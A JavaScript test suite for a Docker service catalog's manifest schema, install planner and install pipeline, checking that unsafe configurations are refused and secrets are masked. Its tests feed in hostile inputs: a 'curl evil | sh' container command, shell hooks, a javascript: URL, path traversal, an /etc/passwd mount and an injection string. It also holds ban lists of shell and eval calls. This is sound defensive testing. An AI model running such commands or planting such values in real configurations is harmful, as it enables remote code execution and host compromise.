// Phase 10D-D — the service catalog and one-click installation.
//
// A manifest is DATA. This suite proves the schema keeps it that way (no hooks, no arbitrary
// Docker fields, no undeclared variables), that the planner turns manifest + config into a
// canonical spec through the same policy as every other create, and that `service.install`
// runs the full pipeline against the mock engine — including rollback and integrations.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { startMockEngine, FLEET, PULLED, PULL_AUTH, CREATED_NETWORKS, CREATED_VOLUMES } from '../test/mock-engine.js';
import { stripComments } from '../test/source-scan.js';

const OLD_ENV = { ...process.env };
const CONFIG_DIR = fs.mkdtempSync(path.join(os.tmpdir(), 'opushub-p10dc-cfg-'));
const DATA_DIR = fs.mkdtempSync(path.join(os.tmpdir(), 'opushub-p10dc-data-'));
process.env.OPUSHUB_CONFIG_DIR = CONFIG_DIR;
process.env.OPUSHUB_DATA_DIR = DATA_DIR;
process.env.OPUSHUB_OP_VERIFY_MS = '3000';
process.env.OPUSHUB_SECRET_KEY = 'd'.repeat(64);
process.env.OPUSHUB_PROXY_PROVIDER = 'traefik';
process.env.OPUSHUB_PROXY_NETWORK = 'proxy';

const ROOT = path.resolve(new URL('..', import.meta.url).pathname);
const code = (rel) => stripComments(fs.readFileSync(path.join(ROOT, rel), 'utf8'));

let ENGINE = null;
let handleApi;
let COOKIE = null;
let VIEWER_COOKIE = null;
let locks, schema, template, planner, provider, catalogStore, regStore, monitoring;

function makeReq(method, body) {
  const headers = { 'content-type': 'application/json', host: 'opushub.test' };
  if (COOKIE) headers.cookie = COOKIE;
  return {
    method, headers,
    [Symbol.asyncIterator]() {
      const chunks = body == null ? [] : [Buffer.from(JSON.stringify(body))];
      let i = 0;
      return { next: async () => (i < chunks.length ? { value: chunks[i++], done: false } : { value: undefined, done: true }) };
    },
  };
}
function makeRes() {
  const state = { status: 200, body: '', headers: {} };
  return { state, setHeader: (k, v) => { state.headers[String(k).toLowerCase()] = v; }, writeHead: (s, h) => { state.status = s; for (const [k, v] of Object.entries(h || {})) state.headers[String(k).toLowerCase()] = v; }, end: (b) => { state.body = String(b ?? ''); } };
}
async function call(method, pathname, body = null, cookie = COOKIE) {
  const saved = COOKIE; COOKIE = cookie;
  const r = makeRes();
  await handleApi(makeReq(method, body), r, new URL(pathname, 'http://opushub.test'));
  COOKIE = saved;
  let json = null; try { json = JSON.parse(r.state.body || 'null'); } catch {}
  return { status: r.state.status, json, text: r.state.body };
}
const get = (p, cookie) => call('GET', p, null, cookie);
const post = (p, body, cookie) => call('POST', p, body, cookie);
const dryRun = (config, id = 'uptime-kuma') => { locks._resetRate(); return post('/api/v1/operations/dry-run', { action: 'service.install', target: { type: 'catalog', id }, params: { config } }); };
async function settle(id, timeoutMs = 20_000) {
  const deadline = Date.now() + timeoutMs;
  let last = null;
  while (Date.now() < deadline) {
    const r = await get(`/api/v1/operations/${id}`);
    last = r.json?.operation || last;
    if (last && !['pending', 'awaiting_confirmation', 'authorized', 'running'].includes(last.status)) return last;
    await new Promise((r) => setTimeout(r, 60));
  }
  return last;
}
async function install(config, id = 'uptime-kuma') {
  locks._resetLimits();
  const d = await dryRun(config, id);
  if (d.status !== 200) return { dryRun: d, operation: d.json?.operation ?? null };
  const e = await post('/api/v1/operations', { action: 'service.install', target: { type: 'catalog', id }, params: { config }, confirmationToken: d.json.confirmation.token, operationId: d.json.operation.id });
  const operation = e.status === 202 ? await settle(e.json.operation.id) : e.json.operation;
  return { dryRun: d, execute: e, operation };
}
const posts = () => ENGINE.log.filter((l) => !l.startsWith('GET '));
const fx = (name) => FLEET.find((f) => f.Names[0] === `/${name}`);
const removeFx = (name) => { const i = FLEET.findIndex((f) => f.Names[0] === `/${name}`); if (i >= 0) FLEET.splice(i, 1); };

test.before(async () => {
  ENGINE = await startMockEngine();
  process.env.OPUSHUB_DOCKER_SOCKET = ENGINE.socketPath;
  delete process.env.DOCKER_HOST;
  ({ handleApi } = await import('./api.js'));
  locks = await import('./operations/locks.js');
  schema = await import('./catalog/schema.js');
  template = await import('./catalog/template.js');
  planner = await import('./catalog/planner.js');
  provider = await import('./proxy/provider.js');
  catalogStore = await import('./catalog/store.js');
  regStore = await import('./registries/store.js');
  monitoring = await import('./monitoring/engine.js');
  const { seedSession } = await import('../test/auth-helper.js');
  COOKIE = await seedSession();
  const auth = await import('./auth.js');
  VIEWER_COOKIE = `${auth.SESSION_COOKIE}=${auth.createSession({ username: 'a-visitor', ip: '127.0.0.1' }).id}`;
});
test.after(async () => {
  await monitoring.stop().catch(() => {});
  await ENGINE?.stop();
  process.env = OLD_ENV;
  fs.rmSync(CONFIG_DIR, { recursive: true, force: true });
  fs.rmSync(DATA_DIR, { recursive: true, force: true });
});
test.beforeEach(() => { locks._resetLimits(); ENGINE.reset(); });

/* ------------------------------ 1. manifests are data ------------------------------ */

test('bundled manifests all validate and carry no executable surface', () => {
  const { manifests, problems } = schema.loadManifests({ force: true });
  assert.deepEqual(problems, []);
  assert.ok(manifests.size >= 5);
  for (const m of manifests.values()) {
    const raw = JSON.stringify(m);
    for (const banned of ['"hooks"', '"script"', '"shell"', '"exec"', 'docker.sock', '"privileged"', '"pid"', '"devices"', '"securityOpt"', '"HostConfig"']) assert.ok(!raw.includes(banned), `${m.id} contains ${banned}`);
    assert.ok(m.image.versions.length >= 1);
  }
});

test('schema refuses hooks, unknown keys, undeclared variables, managed labels and dangerous container fields', () => {
  const base = () => JSON.parse(fs.readFileSync(path.join(ROOT, 'server/catalog/manifests/nginx.json'), 'utf8'));
  const bad = (mut, re) => { const d = base(); mut(d); const v = schema.validateManifest(d); assert.equal(v.ok, false); assert.ok(v.errors.some((e) => re.test(e)), `${re} in ${v.errors.join(' | ')}`); };
  bad((d) => { d.hooks = { postInstall: 'sh -c id' }; }, /unknown key "hooks"/);
  bad((d) => { d.container = { privileged: true }; }, /container\.privileged is not allowed/);
  bad((d) => { d.container = { securityOpt: ['seccomp=unconfined'] }; }, /not allowed/);
  bad((d) => { d.container = { devices: ['/dev/sda'] }; }, /not allowed/);
  bad((d) => { d.container = { command: 'sh -c "curl evil | sh"' }; }, /argv list/);
  bad((d) => { d.env.X = '${UNDECLARED}'; }, /undeclared variable UNDECLARED/);
  bad((d) => { d.env.X = '${name}${HOME}'; }, /undeclared variable HOME/);
  bad((d) => { d.labels = { 'traefik.enable': 'true' }; }, /managed by OpusHub/);
  bad((d) => { d.labels = { 'io.opushub.catalog': 'x' }; }, /managed by OpusHub/);
  bad((d) => { d.volumes[0].default = '../../etc'; }, /volume:<name>|absolute host path/);
  bad((d) => { d.image.repository = 'nginx:latest'; }, /registry repository/);
  bad((d) => { d.healthcheck.test = ['sh', '-c', 'true']; }, /CMD/);
  bad((d) => { d.homepage = 'javascript:alert(1)'; }, /https URL/);
  bad((d) => { d.variables = [{ key: 'name', kind: 'string' }]; }, /not a valid variable name/);
  assert.equal(schema.validateManifest(base()).ok, true);
});

test('templating substitutes declared ${var} only — no defaults, nesting, or environment access', () => {
  assert.equal(template.render('a-${X}-b', { X: '1' }).value, 'a-1-b');
  const miss = template.render('${X}${Y}', { X: '1' });
  assert.equal(miss.ok, false); assert.deepEqual(miss.missing, ['Y']); assert.equal(miss.value, '1${Y}');
  assert.equal(template.render('${X:-fallback}', { X: '1' }).value, '${X:-fallback}', 'bash-style defaults are not a syntax');
  assert.equal(template.render('$X $(id) `id`', { X: '1' }).value, '$X $(id) `id`');
  assert.equal(template.render('${PATH}', { PATH: 'given' }).value, 'given');
  assert.deepEqual([...template.referencesOf('${A} ${B} ${A}')], ['A', 'B']);
});

/* ------------------------------ 2. planner ------------------------------ */

test('planner: config shape is closed, variables are typed, secrets are masked in the plan', async () => {
  const m = schema.getManifest('postgres');
  let b = await planner.buildInstall(m, { name: 'pg1', variables: { POSTGRES_PASSWORD: 'correct-horse-battery' } });
  assert.equal(b.ok, true, JSON.stringify(b.problems));
  assert.equal(b.spec.env.POSTGRES_PASSWORD, 'correct-horse-battery');
  assert.equal(b.spec.env.POSTGRES_USER, 'postgres');
  assert.deepEqual(b.spec.healthcheck.test, ['CMD-SHELL', 'pg_isready -U postgres'], 'variables render inside the healthcheck argv, not shell');
  assert.equal(b.spec.networkMode, 'pg1_net'); assert.deepEqual(b.createNetworks, ['pg1_net']);
  assert.deepEqual(b.namedVolumes, ['pg1-data']);
  assert.equal(b.spec.labels['io.opushub.catalog'], 'postgres');
  assert.equal(b.spec.labels['opushub.update'], 'false');
  b = await planner.buildInstall(m, { name: 'pg1', variables: { POSTGRES_PASSWORD: 'short' } });
  assert.equal(b.ok, false); assert.match(b.problems[0], /at least 12/);
  b = await planner.buildInstall(m, { name: 'pg1' });
  assert.equal(b.ok, false); assert.match(b.problems[0], /required/);
  b = await planner.buildInstall(m, { name: 'pg1', variables: { POSTGRES_PASSWORD: 'correct-horse-battery', EXTRA: 'x' } });
  assert.equal(b.ok, false); assert.match(b.problems[0], /not declared/);
  b = await planner.buildInstall(m, { name: 'pg1', spec: { privileged: true }, variables: { POSTGRES_PASSWORD: 'correct-horse-battery' } });
  assert.equal(b.ok, false); assert.match(b.problems[0], /not an install setting/);
  b = await planner.buildInstall(m, { name: 'pg1', variables: { POSTGRES_PASSWORD: 'correct-horse-battery', POSTGRES_USER: 'x; drop' } });
  assert.equal(b.ok, false); assert.match(b.problems[0], /format/);
  b = await planner.buildInstall(m, { name: '../x', variables: { POSTGRES_PASSWORD: 'correct-horse-battery' } });
  assert.equal(b.ok, false);
});

test('planner: versions, ports, volumes, network and exposure are constrained by the manifest', async () => {
  const m = schema.getManifest('nginx');
  let b = await planner.buildInstall(m, { name: 'web' });
  assert.equal(b.ok, true); assert.equal(b.spec.image, 'nginx:1.27-alpine'); assert.equal(b.spec.ports[0].host, 8080);
  b = await planner.buildInstall(m, { name: 'web', version: 'stable-alpine', ports: { '80/tcp': 9090 } });
  assert.equal(b.spec.image, 'nginx:stable-alpine'); assert.equal(b.spec.ports[0].host, 9090);
  b = await planner.buildInstall(m, { name: 'web', digest: 'sha256:' + 'a'.repeat(64) });
  assert.equal(b.spec.image, 'nginx@sha256:' + 'a'.repeat(64));
  b = await planner.buildInstall(m, { name: 'web', ports: { '443/tcp': 1 } });
  assert.equal(b.ok, false); assert.match(b.problems[0], /not declared/);
  b = await planner.buildInstall(m, { name: 'web', volumes: { '/usr/share/nginx/html': '/srv/site' } });
  assert.equal(b.ok, true); assert.deepEqual(b.spec.volumes[0], { type: 'bind', source: '/srv/site', target: '/usr/share/nginx/html', readOnly: true });
  b = await planner.buildInstall(m, { name: 'web', volumes: { '/usr/share/nginx/html': '/srv/../etc' } });
  assert.equal(b.ok, false);
  b = await planner.buildInstall(m, { name: 'web', volumes: { '/etc/passwd': '/etc/passwd' } });
  assert.equal(b.ok, false); assert.match(b.problems[0], /not declared/);
  b = await planner.buildInstall(m, { name: 'web', network: 'proxy' });
  assert.equal(b.spec.networkMode, 'proxy'); assert.deepEqual(b.createNetworks, []);
  b = await planner.buildInstall(m, { name: 'web', network: 'host' });
  assert.equal(b.ok, false); assert.match(b.problems[0], /not offered/);
  b = await planner.buildInstall(m, { name: 'web', network: 'container:jellyfin' });
  assert.equal(b.ok, false);
  b = await planner.buildInstall(m, { name: 'web', expose: { domain: 'www.example.com' } });
  assert.equal(b.ok, true);
  assert.equal(b.spec.labels['traefik.enable'], 'true');
  assert.equal(b.spec.labels['traefik.http.services.web.loadbalancer.server.port'], '80');
  assert.equal(b.spec.labels['traefik.http.routers.web.rule'], 'Host(`www.example.com`)');
  assert.ok(b.spec.networks.some((n) => n.name === 'proxy'), 'joined the proxy network');
  assert.equal(b.integrations.proxy.url, 'https://www.example.com/');
  b = await planner.buildInstall(m, { name: 'web', expose: { domain: 'not a domain' } });
  assert.equal(b.ok, false);
  b = await planner.buildInstall(schema.getManifest('postgres'), { name: 'pg', expose: { domain: 'db.example.com' }, variables: { POSTGRES_PASSWORD: 'correct-horse-battery' } });
  assert.equal(b.ok, false); assert.match(b.problems[0], /does not declare a web port/);
  b = await planner.buildInstall(m, { name: 'web', autoheal: true, healthcheck: false });
  assert.equal(b.ok, false); assert.match(b.problems[0], /Autoheal needs the healthcheck/);
  b = await planner.buildInstall(m, { name: 'web', autoheal: true, updates: false });
  assert.equal(b.spec.labels.autoheal, 'true'); assert.equal(b.spec.labels['opushub.update'], 'false'); assert.equal(b.spec.labels['diun.enable'], undefined);
});

test('proxy provider: Traefik is one provider behind the abstraction; none applies nothing', () => {
  const t = provider.activeProvider({ OPUSHUB_PROXY_PROVIDER: 'traefik', OPUSHUB_PROXY_NETWORK: 'edge' });
  const labels = t.labelsFor({ domain: 'a.example.com', port: 8080, https: true, scheme: 'http', entrypoint: null }, { name: 'My App' });
  assert.equal(labels['traefik.docker.network'], 'edge');
  assert.equal(labels['traefik.http.routers.my-app.tls'], 'true');
  const n = provider.activeProvider({ OPUSHUB_PROXY_PROVIDER: 'none' });
  assert.equal(n.available, false); assert.deepEqual(n.labelsFor({ domain: 'a.example.com', port: 1 }), {});
  assert.ok(!code('server/catalog/planner.js').includes('traefik'), 'the planner never names a proxy implementation');
  assert.ok(!code('server/catalog/schema.js').includes("'traefik."), 'manifests cannot carry proxy labels');
});

/* ------------------------------ 3. API ------------------------------ */

test('catalog API: browse, search, categories, detail; plan is read-only; no install route', async () => {
  const list = await get('/api/v1/catalog');
  assert.equal(list.status, 200);
  assert.ok(list.json.entries.length >= 5);
  assert.ok(list.json.categories.includes('database'));
  assert.equal(list.json.proxy.provider, 'traefik');
  const search = await get('/api/v1/catalog?q=password');
  assert.deepEqual(search.json.entries.map((e) => e.id), ['vaultwarden']);
  const cat = await get('/api/v1/catalog?category=database');
  assert.deepEqual(cat.json.entries.map((e) => e.id).sort(), ['postgres', 'redis']);
  const detail = await get('/api/v1/catalog/postgres');
  assert.equal(detail.status, 200);
  assert.equal(detail.json.entry.variables.find((v) => v.key === 'POSTGRES_PASSWORD').kind, 'secret');
  assert.ok(detail.json.networks.includes('proxy'));
  assert.equal((await get('/api/v1/catalog/nope')).status, 404);
  const viewerDetail = await get('/api/v1/catalog/postgres', VIEWER_COOKIE);
  assert.equal(viewerDetail.status, 200); assert.equal(viewerDetail.json.permissions.install, false);

  const before = posts().length;
  const plan = await post('/api/v1/catalog/postgres/plan', { config: { name: 'pg-plan', variables: { POSTGRES_PASSWORD: 'correct-horse-battery' } } });
  assert.equal(plan.status, 200); assert.equal(plan.json.ok, true);
  assert.equal(plan.json.plan.kind, 'install');
  assert.ok(plan.json.plan.steps.includes('create network pg-plan_net'));
  assert.ok(!JSON.stringify(plan.json).includes('correct-horse-battery'), 'secrets masked in the plan');
  assert.equal(plan.json.plan._install, undefined, 'runner-only material never crosses the API');
  assert.equal(posts().length, before, 'planning writes nothing to the engine');
  assert.ok(!fx('pg-plan'));
  const badPlan = await post('/api/v1/catalog/postgres/plan', { config: { name: 'pg-plan' } });
  assert.equal(badPlan.json.ok, false); assert.match(badPlan.json.problems[0], /required/);
  await assert.rejects(() => post('/api/v1/catalog/postgres/install', {}), /no route/, 'there is no install route under /catalog');
  assert.equal((await post('/api/v1/catalog/postgres', {})).status, 405);
});

/* ------------------------------ 4. install pipeline ------------------------------ */

test('install: pull → network → volume → create → start → verify healthy → monitor → activity; viewer refused', async () => {
  const viewer = await post('/api/v1/operations/dry-run', { action: 'service.install', target: { type: 'catalog', id: 'redis' }, params: { config: { name: 'cache1' } } }, VIEWER_COOKIE);
  assert.equal(viewer.status, 403);
  const r = await install({ name: 'cache1', variables: { MAXMEMORY: '128mb' }, updates: true }, 'redis');
  assert.equal(r.dryRun.status, 200, JSON.stringify(r.dryRun.json));
  assert.equal(r.dryRun.json.confirmation.mode, 'strong');
  assert.equal(r.operation.status, 'succeeded', JSON.stringify(r.operation.error));
  const wire = posts().map((l) => l.replace(/[0-9a-f]{12,64}/g, '<id>'));
  assert.deepEqual(wire, ['POST /networks/create', 'POST /volumes/create', 'POST /containers/create', 'POST /containers/<id>/start'], 'image already present: no pull');
  assert.equal(r.operation.result.report.image.result, 'present');
  assert.ok(CREATED_NETWORKS.has('cache1_net')); assert.ok(CREATED_VOLUMES.has('cache1-data'));
  const c = fx('cache1');
  assert.ok(c); assert.equal(c.State, 'running');
  assert.deepEqual(c.Config.Cmd, ['redis-server', '--maxmemory', '128mb', '--maxmemory-policy', 'allkeys-lru', '--save', '60', '1']);
  assert.equal(c.Config.Labels['io.opushub.catalog'], 'redis'); assert.equal(c.Config.Labels.autoheal, 'true'); assert.equal(c.Config.Labels['diun.enable'], 'true');
  assert.equal(c.Config.HostConfig.NetworkMode, 'cache1_net');
  assert.equal(r.operation.result.report.container.health, 'healthy');
  assert.equal(r.operation.result.report.monitor.result, 'created');
  assert.equal(r.operation.verification.state, 'running');
  const mon = monitoring.overview().monitors.find((m) => m.target?.service?.name === 'cache1');
  assert.ok(mon); assert.equal(mon.type, 'docker');
  const installs = await get('/api/v1/catalog/installs');
  assert.equal(installs.json.installs[0].status, 'succeeded'); assert.equal(installs.json.installs[0].name, 'cache1');
  assert.ok(!JSON.stringify(installs.json).includes('MAXMEMORY'), 'no variables stored in the install record');
  const listed = await get('/api/v1/catalog');
  assert.ok(listed.json.installed.some((i) => i.manifest === 'redis' && i.name === 'cache1'));
  const act = await get('/api/activity?limit=50');
  assert.ok(JSON.stringify(act.json).includes('installed as cache1'));
});

test('install: a missing image is pulled first with the stored registry credential for its host', async () => {
  regStore.upsertRegistry({ id: 'hub', name: 'Hub', kind: 'dockerhub', endpoint: 'https://registry-1.docker.io', host: 'registry-1.docker.io', username: 'bob', secret: 'hub-PW-SECRET', actor: 'root' });
  PULL_AUTH.length = 0;
  const r = await install({ name: 'web-pull', tag: 'not-present', ports: { '80/tcp': 18090 } }, 'nginx');
  assert.equal(r.operation.status, 'succeeded', JSON.stringify(r.operation.error));
  assert.equal(posts()[0], 'POST /images/create');
  assert.ok(PULLED.get('nginx:not-present') >= 1);
  assert.equal(PULL_AUTH.length, 1, 'stored Docker Hub credential used for the pull');
  assert.equal(r.operation.result.report.image.registry, 'hub');
  assert.ok(r.dryRun.json.dryRun.checks.find((c) => c.key === 'plan'));
  const blob = JSON.stringify([r.dryRun.json, r.operation, (await get(`/api/v1/operations/${r.operation.id}/trail`)).json]);
  assert.ok(!blob.includes('hub-PW-SECRET') && !blob.includes(PULL_AUTH[0].header));
  regStore._resetRegistriesStore();
  removeFx('web-pull');
});

test('install: secrets never appear in the dry-run, operation, activity, events or trail', async () => {
  const r = await install({ name: 'pg2', variables: { POSTGRES_PASSWORD: 'Sup3r-Secret-Value!' } }, 'postgres');
  assert.equal(r.operation.status, 'succeeded', JSON.stringify(r.operation.error));
  const blob = JSON.stringify([r.dryRun.json, r.operation, (await get('/api/activity?limit=100')).json, (await get('/api/v1/events?limit=100')).json, (await get(`/api/v1/operations/${r.operation.id}/trail`)).json]);
  assert.ok(!blob.includes('Sup3r-Secret-Value!'));
  assert.equal(fx('pg2').Config.Env.find((e) => e.startsWith('POSTGRES_PASSWORD=')), 'POSTGRES_PASSWORD=Sup3r-Secret-Value!', 'the container itself gets the real value');
});

test('install: exposure through the proxy provider joins the proxy network and seeds an HTTP monitor', async () => {
  const r = await install({ name: 'kuma', expose: { domain: 'status.example.com' }, ports: { '3001/tcp': null } }, 'uptime-kuma');
  assert.equal(r.operation.status, 'succeeded', JSON.stringify(r.operation.error));
  const c = fx('kuma');
  assert.equal(c.Config.Labels['traefik.http.routers.kuma.rule'], 'Host(`status.example.com`)');
  assert.equal(c.Config.HostConfig.NetworkMode, 'proxy', 'the proxy network is the container\'s network');
  assert.ok(Object.keys(c.Config.NetworkingConfig?.EndpointsConfig || {}).includes('proxy'));
  assert.deepEqual(c.Config.HostConfig.PortBindings, {}, 'no host port when routed through the proxy');
  assert.equal(r.operation.result.url, 'https://status.example.com/');
  const mon = monitoring.overview().monitors.find((m) => m.target?.service?.name === 'kuma');
  assert.equal(mon.type, 'http'); assert.equal(mon.target.url.replace(/\/$/, ''), 'https://status.example.com');
});

test('install: policy refuses a BLOCKED configuration before anything is created', async () => {
  const d = await dryRun({ name: 'web-host', network: 'host' }, 'nginx');
  assert.equal(d.status, 400, JSON.stringify(d.json)); assert.match(d.json.error, /not offered/);
  const blocked = await dryRun({ name: 'web-blocked', ports: { '80/tcp': 2375 } }, 'nginx');
  assert.equal(blocked.status, 200, 'a DANGEROUS finding is allowed with strong confirmation');
  assert.equal(blocked.json.confirmation.mode, 'strong');
  assert.ok(blocked.json.dryRun.checks.find((c) => c.key === 'plan').detail.includes('dangerous'));
  assert.ok(!fx('web-host')); assert.equal(posts().length, 0);
  const conflict = await dryRun({ name: 'jellyfin', ports: { '80/tcp': 18081 } }, 'nginx');
  assert.equal(conflict.status, 409); assert.match(conflict.json.operation.error.reason, /already exists/);
  const port = await dryRun({ name: 'web-port', ports: { '80/tcp': 8096 } }, 'nginx');
  assert.equal(port.status, 409); assert.match(port.json.operation.error.reason, /already published/);
  const missingNet = await dryRun({ name: 'web-net', network: 'no-such-net', ports: { '80/tcp': 18082 } }, 'nginx');
  assert.equal(missingNet.status, 422); assert.match(missingNet.json.operation.error.reason, /does not exist/);
  const badTarget = await post('/api/v1/operations/dry-run', { action: 'service.install', target: { type: 'catalog', id: 'not-a-manifest' }, params: { config: {} } });
  assert.equal(badTarget.status, 404);
});

test('install: the confirmation is bound to the config; a changed config is refused at execute', async () => {
  const d = await dryRun({ name: 'web-bound', ports: { '80/tcp': 18083 } }, 'nginx');
  assert.equal(d.status, 200);
  const e = await post('/api/v1/operations', { action: 'service.install', target: { type: 'catalog', id: 'nginx' }, params: { config: { name: 'web-bound', ports: { '80/tcp': 18084 } } }, confirmationToken: d.json.confirmation.token });
  assert.notEqual(e.status, 202);
  assert.ok(!fx('web-bound')); assert.equal(posts().length, 0);
});

test('install: a failed pull creates nothing; an unhealthy start is rolled back with networks removed and volumes kept', async () => {
  const pull = await install({ name: 'web-nopull', tag: 'nonexistent', ports: { '80/tcp': 18085 } }, 'nginx');
  assert.equal(pull.operation.status, 'failed'); assert.match(pull.operation.error.reason, /could not be pulled/);
  assert.deepEqual(posts(), ['POST /images/create']);
  assert.ok(!fx('web-nopull'));

  ENGINE.reset();
  const r = await install({ name: 'pg-become-unhealthy', variables: { POSTGRES_PASSWORD: 'correct-horse-battery' } }, 'postgres');
  assert.equal(r.operation.status, 'failed', JSON.stringify(r.operation));
  assert.match(r.operation.error.reason, /unhealthy/);
  assert.ok(!fx('pg-become-unhealthy'), 'container removed by rollback');
  assert.ok(!CREATED_NETWORKS.has('pg-become-unhealthy_net'), 'dedicated network removed by rollback');
  assert.ok(CREATED_VOLUMES.has('pg-become-unhealthy-data'), 'named volume kept');
  const wire = posts().map((l) => l.replace(/[0-9a-f]{12,64}/g, '<id>'));
  assert.ok(wire.includes('DELETE /containers/<id>?force=true') || wire.some((l) => l.startsWith('DELETE /containers/')));
  assert.ok(wire.some((l) => l === 'DELETE /networks/pg-become-unhealthy_net'));
  assert.ok(!wire.some((l) => l.startsWith('DELETE /volumes')));
  const rec = (await get('/api/v1/catalog/installs')).json.installs.find((i) => i.name === 'pg-become-unhealthy');
  assert.equal(rec.status, 'failed'); assert.ok(rec.report.warnings.some((w) => /kept/.test(w)));
  assert.ok(!monitoring.overview().monitors.some((m) => m.target?.service?.name === 'pg-become-unhealthy'), 'no monitor for a rolled-back install');
});

test('install: locks — a second install of the same name is refused while the first runs', async () => {
  const d1 = await dryRun({ name: 'web-lock', ports: { '80/tcp': 18086 } }, 'nginx');
  assert.equal(d1.status, 200);
  const e1 = await post('/api/v1/operations', { action: 'service.install', target: { type: 'catalog', id: 'nginx' }, params: { config: { name: 'web-lock', ports: { '80/tcp': 18086 } } }, confirmationToken: d1.json.confirmation.token, operationId: d1.json.operation.id });
  assert.equal(e1.status, 202);
  const d2 = await dryRun({ name: 'web-lock', ports: { '80/tcp': 18086 } }, 'nginx');
  assert.equal(d2.status, 409, JSON.stringify(d2.json));
  assert.ok(['already_running', 'name_taken'].includes(d2.json.operation.error.code), d2.json.operation.error.code);
  const d3 = await dryRun({ name: 'web-lock', ports: { '80/tcp': 18087 } }, 'redis');
  assert.equal(d3.status, 409, 'the container name is locked across manifests');
  const op = await settle(e1.json.operation.id);
  assert.equal(op.status, 'succeeded', JSON.stringify(op.error));
  removeFx('web-lock');
});

/* ------------------------------ 5. source discipline ------------------------------ */

test('catalog modules never spawn, never touch the socket directly, never build engine paths from data', () => {
  for (const rel of ['server/catalog/schema.js', 'server/catalog/template.js', 'server/catalog/planner.js', 'server/catalog/runners.js', 'server/catalog/store.js', 'server/catalogApi.js', 'server/proxy/provider.js']) {
    const src = code(rel);
    for (const banned of ['child_process', 'spawn(', 'execSync', 'execFile', 'docker.sock', 'http.request', 'requestEngine(', 'requestJson(', 'new Function', 'eval(']) assert.ok(!src.includes(banned), `${rel} contains ${banned}`);
  }
  // the runner reaches Docker only through the frozen control adapter
  const runner = code('server/catalog/runners.js');
  assert.ok(runner.includes("from '../updates/recreateAdapter.js'"));
  assert.ok(!/fs\.(write|rm|mkdir|unlink)/.test(runner), 'the runner performs no filesystem operations');
  // manifests are JSON, not modules
  for (const f of fs.readdirSync(path.join(ROOT, 'server/catalog/manifests'))) assert.ok(f.endsWith('.json'), f);
});
